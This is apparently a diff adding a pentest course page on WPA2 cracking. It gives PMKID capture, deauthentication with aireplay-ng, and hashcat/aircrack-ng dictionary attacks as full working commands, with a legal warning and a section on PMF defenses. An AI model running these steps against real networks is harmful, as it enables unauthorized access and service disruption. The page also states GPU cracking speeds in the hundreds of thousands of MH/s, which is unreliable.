+        <div class="section-body">
+            <p>
+                In August 2018, Jens Steube (the author of hashcat) published a discovery that fundamentally
+                changed WPA2 attack logistics: a method to perform offline dictionary attacks against WPA2
+                networks without capturing a 4-way handshake — and without any connected clients present.
+                The PMKID attack requires only a single frame from the AP.
+            </p>
+
+            <div class="highlight-card">
+                <div class="highlight-card-title">
+                    <span>&#128161;</span>
+                    The Steube Discovery (2018)
+                </div>
+                <div class="highlight-card-body">
+                    <p>
+                        The PMKID is a value included in the EAPOL RSN IE (Robust Security Network
+                        Information Element) of the first message in the 4-way handshake. It was designed
+                        to allow roaming clients to reconnect to APs faster. Its derivation is:
+                    </p>
+                    <p style="font-family: 'Courier New', monospace; color: #c4a0d8; background: rgba(5,2,10,0.6); padding: 12px 16px; border-radius: 4px; font-size: 0.85rem;">
+                        PMKID = HMAC-SHA1-128(PMK, "PMK Name" || AP_MAC || Client_MAC)
+                    </p>
+                    <p>
+                        The critical insight: the PMKID is derived directly from the PMK, which is derived
+                        from the PSK. This means that if you can obtain the PMKID from a single RSN IE
+                        frame, you can verify password guesses offline using the same brute-force technique
+                        as handshake cracking — but you never needed a client to authenticate. The AP
+                        broadcasts this value in its association responses.
+                    </p>
+                </div>
+            </div>
+
+            <div class="two-col">
+                <div class="col-card">
+                    <h3>&#128100; Traditional Handshake Capture</h3>
+                    <ul>
+                        <li><span class="li-marker">▸</span>Requires an active client session</li>
+                        <li><span class="li-marker">▸</span>Must wait for natural association or force deauth</li>
+                        <li><span class="li-marker">▸</span>Deauth generates detectable noise</li>
+                        <li><span class="li-marker">▸</span>Race condition: client may not reconnect</li>
+                        <li><span class="li-marker">▸</span>Capture may be incomplete (partial handshake)</li>
+                        <li><span class="li-marker">▸</span>Works against all WPA2 networks</li>
+                    </ul>
+                </div>
+                <div class="col-card">
+                    <h3>&#9889; PMKID Attack</h3>
+                    <ul>
+                        <li><span class="li-marker">▸</span>No connected client required</li>
+                        <li><span class="li-marker">▸</span>Single association request to the AP</li>
+                        <li><span class="li-marker">▸</span>Much quieter — one transaction</li>
+                        <li><span class="li-marker">▸</span>Deterministic: AP always provides PMKID</li>
+                        <li><span class="li-marker">▸</span>Works even with no active users on network</li>
+                        <li><span class="li-marker">▸</span>Only works if AP uses PMKID roaming feature</li>
+                    </ul>
+                </div>
+            </div>
+
+            <div class="detail-section">
+                <div class="detail-header" onclick="toggleDetail(this)">
+                    <div class="detail-header-left">
+                        <span class="detail-header-icon">&#128736;</span>
+                        <div>
+                            <div class="detail-header-title">PMKID Capture with hcxdumptool</div>
+                            <div class="detail-header-subtitle">Extracting the PMKID from a single AP frame</div>
+                        </div>
+                    </div>
+                    <span class="detail-toggle">&#9660;</span>
+                </div>
+                <div class="detail-body">
+                    <p>
+                        The hcxdumptool + hcxtools suite was purpose-built for PMKID capture. hcxdumptool
+                        handles frame injection and capture; hcxtools converts the output to formats that
+                        hashcat can process directly.
+                    </p>
+                    <div class="code-block">
+<span class="comment"># Step 1: Kill interfering processes before capture</span>
+$ sudo airmon-ng check kill
+
+<span class="comment"># Step 2: Capture PMKID from all APs in range</span>
+<span class="comment"># hcxdumptool sends association frames and captures RSN IEs</span>
+$ sudo hcxdumptool <span class="flag">-o</span> output.pcapng <span class="flag">-i</span> wlan0 <span class="flag">--enable_status=1</span>
+
+<span class="comment"># Step 3: Target a specific BSSID only (reduces noise)</span>
+$ sudo hcxdumptool <span class="flag">-o</span> output.pcapng <span class="flag">-i</span> wlan0 \
+  <span class="flag">--filterlist_ap=</span><span class="str">target_bssid.txt</span> <span class="flag">--filtermode=2</span>
+
+<span class="comment"># Step 4: Convert pcapng to hashcat format (22000)</span>
+$ hcxpcapngtool <span class="flag">-o</span> hashes.hc22000 output.pcapng
+
+<span class="comment"># Step 5: Crack with hashcat</span>
+$ hashcat <span class="flag">-m</span> 22000 hashes.hc22000 wordlist.txt
+                    </div>
+                    <p>
+                        The hashcat mode 22000 handles both PMKID (single-frame) and EAPOL (4-way handshake)
+                        captures in a unified format introduced in 2020 to replace the older mode 2500.
+                        If the AP supports PMKID, hcxdumptool will capture it within seconds of starting —
+                        no waiting for client activity.
+                    </p>
+                </div>
+            </div>
+
+            <div class="detail-section">
+                <div class="detail-header" onclick="toggleDetail(this)">
+                    <div class="detail-header-left">
+                        <span class="detail-header-icon">&#128683;</span>
+                        <div>
+                            <div class="detail-header-title">When PMKID Is Not Available</div>
+                            <div class="detail-header-subtitle">Routers that disable PMKID and fallback approaches</div>
+                        </div>
+                    </div>
+                    <span class="detail-toggle">&#9660;</span>
+                </div>
+                <div class="detail-body">
+                    <p>
+                        Not all access points expose a PMKID. Some enterprise-grade and security-hardened
+                        consumer routers disable the RSN PMKID capability specifically to block this attack
+                        class. Indicators that PMKID is unavailable:
+                    </p>
+                    <ul>
+                        <li>hcxdumptool runs for several minutes with no PMKID captures</li>
+                        <li>hcxpcapngtool reports zero PMKID entries in output</li>
+                        <li>The AP's RSN Information Element omits the PMKID field</li>
+                    </ul>
+                    <p>
+                        In these cases, fall back to traditional 4-way handshake capture using airodump-ng
+                        and aireplay-ng, as covered in Sections 3 and 4. The offline cracking phase is
+                        identical once either a PMKID or a full handshake has been captured.
+                    </p>
+                </div>
+            </div>
+
+            <div class="callout callout-tip">
+                <span class="callout-icon">&#10003;</span>
+                <div class="callout-content">
+                    <div class="callout-title">Operational Preference</div>
+                    <div class="callout-text">
+                        Always attempt PMKID capture first. It is faster, quieter, and does not require
+                        waiting for client activity. If the AP supports it, a usable hash is typically
+                        obtained within 10-30 seconds. Reserve deauthentication-based handshake capture
+                        for situations where PMKID is unavailable — the deauth frames are detectable by
+                        any WIDS and create unnecessary engagement noise on a pentest.
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Section 3: Targeted Capture with airodump-ng -->
+    <div class="section" id="s3">
+        <div class="section-number">Section 03</div>
+        <h2 class="section-title">
+            <span class="section-icon">&#128225;</span>
+            Targeted Capture with airodump-ng
+        </h2>
+        <div class="section-body">
+            <p>
+                When PMKID capture is not viable and a traditional 4-way handshake is required, airodump-ng
+                is the standard tool for locking onto the target network and writing all 802.11 frames to
+                a capture file. The key is filtering to the target channel and BSSID immediately — capturing
+                all traffic from all channels creates large files and makes handshake identification harder.
+            </p>
+
+            <div class="detail-section">
+                <div class="detail-header" onclick="toggleDetail(this)">
+                    <div class="detail-header-left">
+                        <span class="detail-header-icon">&#128247;</span>
+                        <div>
+                            <div class="detail-header-title">Phase 1: Network Discovery Scan</div>
+                            <div class="detail-header-subtitle">Enumerate all visible APs and identify target parameters</div>
+                        </div>
+                    </div>
+                    <span class="detail-toggle">&#9660;</span>
+                </div>
+                <div class="detail-body">
+                    <p>
+                        Begin with an unfiltered scan to discover all nearby networks. This provides the
+                        target's BSSID (MAC address of the AP) and operating channel — both required for
+                        the targeted capture phase.
+                    </p>
+                    <div class="code-block">
+<span class="comment"># Ensure monitor mode is active</span>
+$ sudo airmon-ng start wlan0
+<span class="comment"># Creates wlan0mon (or similar)</span>
+
+<span class="comment"># General scan: displays all APs and clients within range</span>
+<span class="comment"># Upper section: APs with BSSID, channel (CH), encryption (ENC), ESSID</span>
+<span class="comment"># Lower section: clients, which AP they are associated with</span>
+$ sudo airodump-ng wlan0mon
+                    </div>
+                    <p>
+                        Key columns in airodump-ng output to note before proceeding:
+                    </p>
+                    <ul>
+                        <li><strong style="color: #c4a0d8;">BSSID</strong> — MAC address of the AP (target identifier)</li>
+                        <li><strong style="color: #c4a0d8;">CH</strong> — Operating channel (1-13 for 2.4 GHz, 36-165 for 5 GHz)</li>
+                        <li><strong style="color: #c4a0d8;">ENC</strong> — Encryption type (WPA2, WPA3, OPN, etc.)</li>
+                        <li><strong style="color: #c4a0d8;">CIPHER</strong> — CCMP (AES) or TKIP</li>
+                        <li><strong style="color: #c4a0d8;">STATION</strong> — MAC addresses of associated clients (in lower section)</li>
+                    </ul>
+                    <p>
+                        Record the target BSSID and CH values before proceeding to the locked capture.
+                        Press Ctrl+C to stop the scan.
+                    </p>
+                </div>
+            </div>
+
+            <div class="detail-section">
+                <div class="detail-header" onclick="toggleDetail(this)">
+                    <div class="detail-header-left">
+                        <span class="detail-header-icon">&#128275;</span>
+                        <div>
+                            <div class="detail-header-title">Phase 2: Targeted Channel-Locked Capture</div>
+                            <div class="detail-header-subtitle">Filter by BSSID and channel, write to file</div>
+                        </div>
+                    </div>
+                    <span class="detail-toggle">&#9660;</span>
+                </div>
+                <div class="detail-body">
+                    <p>
+                        With the target identified, start a filtered capture session that locks the adapter
+                        to the AP's channel, filters by BSSID, and writes all frames to a capture file.
+                        The "WPA handshake" banner in the top-right corner of the airodump-ng display
+                        confirms a usable handshake has been captured.
+                    </p>
+                    <div class="code-block">
+<span class="comment"># Targeted capture — replace values with actual target parameters</span>
+<span class="comment"># -c : lock to specific channel (prevents hopping)</span>
+<span class="comment"># --bssid : filter to only frames from/to this AP</span>
+<span class="comment"># -w : write prefix (creates prefix-01.cap, prefix-01.csv, etc.)</span>
+$ sudo airodump-ng \
+  <span class="flag">-c</span> <span class="str">6</span> \
+  <span class="flag">--bssid</span> <span class="str">AA:BB:CC:DD:EE:FF</span> \
+  <span class="flag">-w</span> <span class="str">handshake_capture</span> \
+  wlan0mon
+                    </div>
+                    <p>
+                        Output files created by airodump-ng with <code style="color:#c4a0d8;">-w handshake_capture</code>:
+                    </p>
+                    <table class="mini-table">
+                        <thead>
+                            <tr>
+                                <th>File</th>
+                                <th>Format</th>
+                                <th>Purpose</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td style="font-family:'Courier New',monospace; color:#c4a0d8;">handshake_capture-01.cap</td>
+                                <td>PCAP</td>
+                                <td>Raw 802.11 frame capture — used for handshake cracking</td>
+                            </tr>
+                            <tr>
+                                <td style="font-family:'Courier New',monospace; color:#c4a0d8;">handshake_capture-01.csv</td>
+                                <td>CSV</td>
+                                <td>AP and client summary data — BSSID, ESSID, cipher, beacon count</td>
+                            </tr>
+                            <tr>
+                                <td style="font-family:'Courier New',monospace; color:#c4a0d8;">handshake_capture-01.kismet.csv</td>
+                                <td>Kismet CSV</td>
+                                <td>Kismet-compatible format for additional analysis</td>
+                            </tr>
+                            <tr>
+                                <td style="font-family:'Courier New',monospace; color:#c4a0d8;">handshake_capture-01.kismet.netxml</td>
+                                <td>Kismet NetXML</td>
+                                <td>XML-format network summary for Kismet network mapping</td>
+                            </tr>
+                        </tbody>
+                    </table>
+                    <p>
+                        Keep this airodump-ng session running in one terminal pane while executing the
+                        deauthentication attack in another. Watch the top-right of the display for the
+                        "WPA handshake: AA:BB:CC:DD:EE:FF" confirmation string.
+                    </p>
+                </div>
+            </div>
+
+            <div class="callout callout-info">
+                <span class="callout-icon">&#8505;</span>
+                <div class="callout-content">
+                    <div class="callout-title">Passive Capture (No Deauth)</div>
+                    <div class="callout-text">
+                        If you have the patience to wait, a handshake will be captured naturally whenever
+                        any client authenticates to the AP — after a reboot, power cycle, coming in range
+                        from a trip, or after signal loss. On a busy network this may take minutes. On a
+                        low-traffic network (e.g., a home AP in the evening with all devices already
+                        connected) it may take hours. Passive capture produces zero detectable noise and
+                        is the preferred approach in stealth-priority engagements.
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Section 4: Forcing Handshakes: Deauthentication -->
+    <div class="section" id="s4">
+        <div class="section-number">Section 04</div>
+        <h2 class="section-title">
+            <span class="section-icon">&#128165;</span>
+            Forcing Handshakes: Deauthentication Attacks
+        </h2>
+        <div class="section-body">
+            <p>
+                Deauthentication attacks exploit a fundamental design decision in the original 802.11
+                specification: management frames (including deauthentication and disassociation frames)
+                are not authenticated or encrypted. Any attacker within radio range can forge a
+                deauthentication frame that appears to originate from either the AP or a connected client,
+                causing the target device to disconnect and reconnect — triggering a new 4-way handshake.
+            </p>
+
+            <div class="concept-grid">
+                <div class="concept-card">
+                    <div class="concept-card-icon">&#127919;</div>
+                    <div class="concept-card-title">Targeted Deauth</div>
+                    <div class="concept-card-body">
+                        Specifies both the AP BSSID and the client MAC address. Sends deauth frames
+                        impersonating the AP to the specific client. More surgical — disconnects only
+                        one device. Requires knowing a connected client's MAC from the airodump-ng
+                        STATION section. Preferred approach: less collateral disruption.
+                    </div>
+                    <span class="concept-tag">Targeted</span>
+                </div>
+                <div class="concept-card">
+                    <div class="concept-card-icon">&#128267;</div>
+                    <div class="concept-card-title">Broadcast Deauth</div>
+                    <div class="concept-card-body">
+                        Omits the client MAC address, targeting FF:FF:FF:FF:FF:FF (broadcast). Sends
+                        deauth frames to all connected clients simultaneously. More disruptive but
+                        useful when no specific client MAC is visible, or when the network has multiple
+                        clients. Creates more observable interference in WIDS environments.
+                    </div>
+                    <span class="concept-tag">Broadcast</span>
+                </div>
+                <div class="concept-card">
+                    <div class="concept-card-icon">&#128200;</div>
+                    <div class="concept-card-title">Packet Count Strategy</div>
+                    <div class="concept-card-body">
+                        The <code style="color:#c4a0d8;">-0</code> flag takes a count argument for
+                        how many deauth frames to send. A count of 1-5 is typically sufficient to
+                        force a disconnect. Sending too many (e.g., -0 0 for continuous) creates a
+                        sustained DoS and maximizes WIDS detection probability. Send enough to
+                        disconnect, then stop.
+                    </div>
+                    <span class="concept-tag">Count</span>
+                </div>
+                <div class="concept-card">
+                    <div class="concept-card-icon">&#9200;</div>
+                    <div class="concept-card-title">Timing and Capture Coordination</div>
+                    <div class="concept-card-body">
+                        The airodump-ng capture session must be running before the deauth is sent.
+                        After a client disconnects, it typically reassociates within 1-3 seconds.
+                        The handshake occurs during this reassociation window. Confirm capture in
+                        the airodump-ng window before stopping the capture session.
+                    </div>
+                    <span class="concept-tag">Timing</span>
+                </div>
+            </div>
+
+            <div class="detail-section">
+                <div class="detail-header" onclick="toggleDetail(this)">
+                    <div class="detail-header-left">
+                        <span class="detail-header-icon">&#128736;</span>
+                        <div>
+                            <div class="detail-header-title">aireplay-ng Deauth Command Reference</div>
+                            <div class="detail-header-subtitle">Full flag breakdown and usage patterns</div>
+                        </div>
+                    </div>
+                    <span class="detail-toggle">&#9660;</span>
+                </div>
+                <div class="detail-body">
+                    <div class="code-block">
+<span class="comment"># Targeted deauth: disconnect a specific client from the AP</span>
+<span class="comment"># -0 : deauthentication attack mode</span>
+<span class="comment">#  5 : send 5 deauth packets (sufficient; avoid 0 = continuous)</span>
+<span class="comment"># -a : AP BSSID (the network to deauth from)</span>
+<span class="comment"># -c : client MAC address (station to disconnect)</span>
+$ sudo aireplay-ng \
+  <span class="flag">-0</span> <span class="str">5</span> \
+  <span class="flag">-a</span> <span class="str">AA:BB:CC:DD:EE:FF</span> \
+  <span class="flag">-c</span> <span class="str">11:22:33:44:55:66</span> \
+  wlan0mon
+
+<span class="comment"># Broadcast deauth: disconnect all clients from the AP</span>
+<span class="comment"># Omit -c flag to broadcast to all stations</span>
+$ sudo aireplay-ng \
+  <span class="flag">-0</span> <span class="str">3</span> \
+  <span class="flag">-a</span> <span class="str">AA:BB:CC:DD:EE:FF</span> \
+  wlan0mon
+
+<span class="comment"># Expected output when successful:</span>
+<span class="comment"># 22:15:37  Sending 64 directed DeAuth (code 7). STMAC: [11:22:33:44:55:66]</span>
+<span class="comment"># (Sent once per packet)</span>
+                    </div>
+                    <p>
+                        The adapter used for aireplay-ng must be on the same channel as the target AP.
+                        If airodump-ng locked the adapter to channel 6 with the <code style="color:#c4a0d8;">-c 6</code>
+                        flag, aireplay-ng will operate on channel 6 automatically. Using two adapters
+                        (one for capture, one for injection) avoids timing conflicts where the capture
+                        adapter is busy injecting frames.
+                    </p>
+                </div>
+            </div>
+
+            <div class="detail-section">
+                <div class="detail-header" onclick="toggleDetail(this)">
+                    <div class="detail-header-left">
+                        <span class="detail-header-icon">&#128737;</span>
+                        <div>
+                            <div class="detail-header-title">Why PMF Blocks This Attack</div>
+                            <div class="detail-header-subtitle">802.11w Protected Management Frames and WPA3 mandatory protection</div>
+                        </div>
+                    </div>
+                    <span class="detail-toggle">&#9660;</span>
+                </div>
+                <div class="detail-body">
+                    <p>
+                        IEEE 802.11w (2009) introduced Protected Management Frames (PMF), which applies
+                        cryptographic integrity protection to management frames — including deauthentication
+                        and disassociation frames. When PMF is enabled, these frames are signed with a MIC
+                        derived from the session keys. Forged deauth frames without a valid MIC are
+                        silently discarded by PMF-enabled clients.
+                    </p>
+                    <p>
+                        PMF deployment status:
+                    </p>
+                    <ul>
+                        <li><strong style="color: #c4a0d8;">WPA2 Personal:</strong> PMF is optional (often disabled or set to "capable" mode, which negotiates PMF only if both sides support it)</li>
+                        <li><strong style="color: #c4a0d8;">WPA3 Personal:</strong> PMF is mandatory — required by the WPA3 specification. Deauthentication-based handshake capture is not possible against WPA3 networks</li>
+                        <li><strong style="color: #c4a0d8;">WPA2 with PMF enabled:</strong> Deauth injection will fail silently — aireplay-ng sends frames but clients ignore them</li>
+                    </ul>
+                    <p>
+                        To check if a target network has PMF enabled, examine the RSN Capabilities field
+                        in the beacon frame (visible in Wireshark: filter <code style="color:#c4a0d8;">wlan.fc.type_subtype == 0x08</code>,
+                        then look for RSN Information &gt; RSN Capabilities &gt; Management Frame Protection
+                        Required/Capable bits). Alternatively, attempt deauth — if the client does not
+                        reconnect and no handshake is captured, PMF is likely enforced.
+                    </p>
+                </div>
+            </div>
+
+            <div class="callout callout-danger">
+                <span class="callout-icon">&#9888;</span>
+                <div class="callout-content">
+                    <div class="callout-title">Legal and Ethical Constraints</div>
+                    <div class="callout-text">
+                        Sending deauthentication frames against a network you do not own or have written
+                        authorization to test is illegal under the Computer Fraud and Abuse Act (US),
+                        the Computer Misuse Act (UK), and equivalent statutes globally. Even if the target
+                        is your own home network, be aware that injecting frames in the 2.4 GHz or 5 GHz
+                        spectrum can interfere with neighboring networks and may violate FCC Part 15 rules
+                        on intentional interference. All practical exercises must occur on isolated lab
+                        networks with appropriate RF shielding or in jurisdictions and contexts where
+                        you have explicit authorization.
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Section 5: Handshake Verification -->
+    <div class="section" id="s5">
+        <div class="section-number">Section 05</div>
+        <h2 class="section-title">
+            <span class="section-icon">&#128269;</span>
+            Handshake Verification
+        </h2>
+        <div class="section-body">
+            <p>
+                Capturing a .cap file does not guarantee it contains a usable handshake. Network packet
+                loss, timing issues, or partial captures (only 2 of 4 EAPOL messages) can produce files
+                that appear to contain a handshake but fail to crack. Always verify the capture before
+                investing hours of compute time in cracking a defective file.
+            </p>
+
+            <div class="detail-section">
+                <div class="detail-header" onclick="toggleDetail(this)">
+                    <div class="detail-header-left">
+                        <span class="detail-header-icon">&#128272;</span>
+                        <div>
+                            <div class="detail-header-title">Method 1: aircrack-ng Quick Verification</div>
+                            <div class="detail-header-subtitle">Fast check for EAPOL presence without running a full crack</div>
+                        </div>
+                    </div>
+                    <span class="detail-toggle">&#9660;</span>
+                </div>
+                <div class="detail-body">
+                    <p>
+                        Run aircrack-ng with a short wordlist (or even no wordlist) against the capture
+                        file. It will report whether it found a valid handshake and which BSSID it belongs
+                        to, without needing to run a full dictionary attack.
+                    </p>
+                    <div class="code-block">
+<span class="comment"># Quick verification: check for handshake presence</span>
+<span class="comment"># No wordlist needed — aircrack reports handshake status on launch</span>
+$ aircrack-ng handshake_capture-01.cap
+
+<span class="comment"># Output if handshake present:</span>
+<span class="comment">#   Index number : 1</span>
+<span class="comment">#   BSSID        : AA:BB:CC:DD:EE:FF</span>
+<span class="comment">#   ESSID        : TargetNetwork</span>
+<span class="comment">#   Encryption   : WPA (1 handshake)</span>
+
+<span class="comment"># Targeted verification against specific BSSID</span>
+$ aircrack-ng <span class="flag">-b</span> <span class="str">AA:BB:CC:DD:EE:FF</span> handshake_capture-01.cap
+
+<span class="comment"># Full crack attempt with wordlist (after verification passes)</span>
+$ aircrack-ng <span class="flag">-w</span> <span class="str">/usr/share/wordlists/rockyou.txt</span> \
+  <span class="flag">-b</span> <span class="str">AA:BB:CC:DD:EE:FF</span> handshake_capture-01.cap
+                    </div>
+                    <p>
+                        aircrack-ng reports "(1 handshake)" if at least messages 1+2 or 2+3 of the EAPOL
+                        exchange were captured. The "(1 handshake)" count is not always sufficient — if
+                        only messages 3+4 were captured (without message 1 or 2 containing the MIC), the
+                        file may be listed as having a handshake but produce zero results during cracking.
+                    </p>
+                </div>
+            </div>
+
+            <div class="detail-section">
+                <div class="detail-header" onclick="toggleDetail(this)">
+                    <div class="detail-header-left">
+                        <span class="detail-header-icon">&#128200;</span>
+                        <div>
+                            <div class="detail-header-title">Method 2: Wireshark EAPOL Analysis</div>
+                            <div class="detail-header-subtitle">Inspect all 4 messages and verify MIC fields</div>
+                        </div>
+                    </div>
+                    <span class="detail-toggle">&#9660;</span>
+                </div>
+                <div class="detail-body">
+                    <p>
+                        Wireshark provides granular visibility into which EAPOL messages were captured and
+                        whether they are well-formed. This is the definitive verification method for
+                        diagnosing partial captures.
+                    </p>
+                    <div class="code-block">
+<span class="comment"># Open capture file in Wireshark</span>
+$ wireshark handshake_capture-01.cap
+
+<span class="comment"># Wireshark display filter for EAPOL frames only</span>
+<span class="str">eapol</span>
+
+<span class="comment"># Alternative: filter EAPOL within target BSSID traffic</span>
+<span class="str">eapol and wlan.bssid == aa:bb:cc:dd:ee:ff</span>
+                    </div>
+                    <p>
+                        With the EAPOL filter applied, inspect the packet list. You should see frames with
+                        descriptions like "Key (Message 1 of 4)", "Key (Message 2 of 4)", etc. Verify:
+                    </p>
+                    <ul>
+                        <li>Messages 1 and 2 are present (ANonce + SNonce exchange)</li>
+                        <li>Message 2 contains a non-zero MIC field (expand 802.1X Authentication &gt; WPA Key MIC)</li>
+                        <li>The source and destination MACs match the AP and client</li>
+                        <li>Timestamps show all messages within a few hundred milliseconds of each other</li>
+                    </ul>
+                    <p>
+                        A zero-value MIC in message 2 indicates a corrupted or truncated capture.
+                        Recapture is required.
+                    </p>
+                </div>
+            </div>
+
+            <div class="detail-section">
+                <div class="detail-header" onclick="toggleDetail(this)">
+                    <div class="detail-header-left">
+                        <span class="detail-header-icon">&#128202;</span>
+                        <div>
+                            <div class="detail-header-title">Partial Handshake Risks</div>
+                            <div class="detail-header-subtitle">What incomplete captures look like and how to avoid them</div>
+                        </div>
+                    </div>
+                    <span class="detail-toggle">&#9660;</span>
+                </div>
+                <div class="detail-body">
+                    <p>
+                        A "partial handshake" typically means fewer than the two required EAPOL messages
+                        were captured with intact MIC fields. Common causes:
+                    </p>
+                    <ul>
+                        <li><strong style="color: #c4a0d8;">Radio interference:</strong> Frame loss during the brief handshake window; captured message 1 but missed message 2</li>
+                        <li><strong style="color: #c4a0d8;">Distance:</strong> Adapter too far from client to reliably capture client-to-AP frames (asymmetric signal strength)</li>
+                        <li><strong style="color: #c4a0d8;">Timing:</strong> airodump-ng capture started after the handshake completed</li>
+                        <li><strong style="color: #c4a0d8;">Driver issues:</strong> Some Linux wireless drivers drop frames in monitor mode under high traffic conditions</li>
+                    </ul>
+                    <p>
+                        If repeated capture attempts yield partial handshakes, consider: moving closer to
+                        the target AP, using a directional antenna, using a different wireless adapter with
+                        better monitor mode driver support (Alfa AWUS036ACH, TP-Link TL-WN722N v1), or
+                        increasing deauth packet count slightly to ensure full client disconnection and
+                        clean reassociation.
+                    </p>
+                </div>
+            </div>
+
+            <div class="detail-section">
+                <div class="detail-header" onclick="toggleDetail(this)">
+                    <div class="detail-header-left">
+                        <span class="detail-header-icon">&#128736;</span>
+                        <div>
+                            <div class="detail-header-title">Converting to Hashcat Format</div>
+                            <div class="detail-header-subtitle">hcxtools conversion for GPU-accelerated cracking</div>
+                        </div>
+                    </div>
+                    <span class="detail-toggle">&#9660;</span>
+                </div>
+                <div class="detail-body">
+                    <p>
+                        For GPU-accelerated cracking with hashcat (which is significantly faster than
+                        aircrack-ng's CPU-based cracking), the .cap file must be converted to hashcat's
+                        22000 format using hcxpcapngtool.
+                    </p>
+                    <div class="code-block">
+<span class="comment"># Convert .cap to hashcat 22000 format (handles both PMKID and EAPOL)</span>
+$ hcxpcapngtool \
+  <span class="flag">-o</span> hashes.hc22000 \
+  handshake_capture-01.cap
+
+<span class="comment"># Verify output file contains hashes</span>
+$ wc <span class="flag">-l</span> hashes.hc22000
+<span class="comment"># Non-zero line count confirms valid hashes extracted</span>
+
+<span class="comment"># Hashcat dictionary attack against WPA2 handshake (mode 22000)</span>
+$ hashcat \
+  <span class="flag">-m</span> 22000 \
+  <span class="flag">-a</span> 0 \
+  hashes.hc22000 \
+  /usr/share/wordlists/rockyou.txt
+
+<span class="comment"># Hashcat rule-based attack (mutates wordlist with common substitutions)</span>
+$ hashcat \
+  <span class="flag">-m</span> 22000 \
+  <span class="flag">-a</span> 0 \
+  <span class="flag">-r</span> /usr/share/hashcat/rules/best64.rule \
+  hashes.hc22000 \
+  /usr/share/wordlists/rockyou.txt
+                    </div>
+                    <p>
+                        hashcat with a GPU typically achieves 300,000-1,000,000+ MH/s against WPA2 on
+                        modern consumer graphics cards — vastly outperforming aircrack-ng's CPU-only
+                        throughput of roughly 1,000-10,000 passwords per second.
+                    </p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Section 6: The Complete Attack Flow -->
+    <div class="section" id="s6">
+        <div class="section-number">Section 06</div>
+        <h2 class="section-title">
+            <span class="section-icon">&#127760;</span>
+            The Complete Attack Flow
+        </h2>
+        <div class="section-body">
+            <p>
+                The following end-to-end walkthrough synthesizes all preceding sections into a sequential,
+                operational procedure. Each step builds on the previous. A dual-pane or multi-pane terminal
+                layout (tmux recommended) allows simultaneous monitoring of capture status and injection
+                output without losing context.
+            </p>
+
+            <!-- Attack flow diagram -->
+            <div class="flow-diagram">
+                <div class="flow-title">Complete Handshake Capture Attack Flow</div>
+                <div class="flow-steps">
+                    <div class="flow-step">
+                        <div class="flow-step-num">01</div>
+                        <div class="flow-step-label">Monitor Mode</div>
+                        <div class="flow-step-detail">airmon-ng start wlan0<br>Creates wlan0mon</div>
+                    </div>
+                    <div class="flow-arrow">&#8594;</div>
+                    <div class="flow-step">
+                        <div class="flow-step-num">02</div>
+                        <div class="flow-step-label">Network Scan</div>
+                        <div class="flow-step-detail">airodump-ng wlan0mon<br>Identify BSSID + CH</div>
+                    </div>
+                    <div class="flow-arrow">&#8594;</div>
+                    <div class="flow-step">
+                        <div class="flow-step-num">03</div>
+                        <div class="flow-step-label">Targeted Capture</div>
+                        <div class="flow-step-detail">airodump-ng locked<br>on BSSID + channel</div>
+                    </div>
+                    <div class="flow-arrow">&#8594;</div>
+                    <div class="flow-step">
+                        <div class="flow-step-num">04</div>
+                        <div class="flow-step-label">Deauth Injection</div>
+                        <div class="flow-step-detail">aireplay-ng -0 5<br>Force reconnection</div>
+                    </div>
+                    <div class="flow-arrow">&#8594;</div>
+                    <div class="flow-step">
+                        <div class="flow-step-num">05</div>
+                        <div class="flow-step-label">Confirm + Crack</div>
+                        <div class="flow-step-detail">Verify handshake<br>aircrack-ng / hashcat</div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="detail-section">
+                <div class="detail-header" onclick="toggleDetail(this)">
+                    <div class="detail-header-left">
+                        <span class="detail-header-icon">&#128421;</span>
+                        <div>
+                            <div class="detail-header-title">Multi-Pane tmux Layout</div>
+                            <div class="detail-header-subtitle">Recommended terminal layout for capture + injection workflow</div>
+                        </div>
+                    </div>
+                    <span class="detail-toggle">&#9660;</span>
+                </div>
+                <div class="detail-body">
+                    <p>
+                        Running airodump-ng and aireplay-ng in separate panes prevents each tool from
+                        interfering with the other's output. The following tmux layout provides a clean
+                        workflow: capture pane on the left watching for the handshake banner, injection
+                        pane on the right for the deauth command.
+                    </p>
+
+                    <div class="tmux-layout">
+                        <div class="tmux-bar">
+                            <span class="tmux-tab active">0: handshake-capture</span>
+                            <span style="margin-left: auto;">[kali 2026-02-26]</span>
+                        </div>
+                        <div class="tmux-panes">
+                            <div class="tmux-pane">
+                                <div class="tmux-pane-label">Pane 1 — airodump-ng capture</div>
+<span class="kw">$</span> sudo airodump-ng \
+  <span class="flag">-c 6</span> \
+  <span class="flag">--bssid</span> <span class="str">AA:BB:CC:DD:EE:FF</span> \
+  <span class="flag">-w</span> <span class="str">capture</span> \
+  wlan0mon
+
+<span class="comment"> CH  6 ][ Elapsed: 12 s ][ WPA handshake: AA:BB:CC:DD:EE:FF</span>
+
+ BSSID              PWR  Beacons  #Data  CH  ENC   ESSID
+ <span class="str">AA:BB:CC:DD:EE:FF</span>  -42  124      18     6   WPA2  TargetNet
+
+ BSSID              STATION            PWR   Rate
+ <span class="str">AA:BB:CC:DD:EE:FF</span>  <span class="warn">11:22:33:44:55:66</span>  -61   1e- 1
+                            </div>
+                            <div class="tmux-pane">
+                                <div class="tmux-pane-label">Pane 2 — aireplay-ng deauth</div>
+<span class="kw">$</span> sudo aireplay-ng \
+  <span class="flag">-0</span> <span class="str">5</span> \
+  <span class="flag">-a</span> <span class="str">AA:BB:CC:DD:EE:FF</span> \
+  <span class="flag">-c</span> <span class="str">11:22:33:44:55:66</span> \
+  wlan0mon
+
+<span class="success">22:15:37 Sending 64 directed DeAuth</span>
+<span class="success">         STMAC: [11:22:33:44:55:66]</span>
+<span class="comment">         [64|63 ACKs]</span>
+
+<span class="comment"># Handshake captured in pane 1.</span>
+<span class="comment"># Now verify with aircrack-ng:</span>
+<span class="kw">$</span> aircrack-ng capture-01.cap
+<span class="success">  WPA (1 handshake)</span>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="code-block" style="margin-top: 16px;">
+<span class="comment"># tmux session setup for this workflow</span>
+$ tmux new-session <span class="flag">-s</span> handshake
+
+<span class="comment"># Split window vertically (left/right panes)</span>
+<span class="comment"># Inside tmux: Ctrl+B then %</span>
+
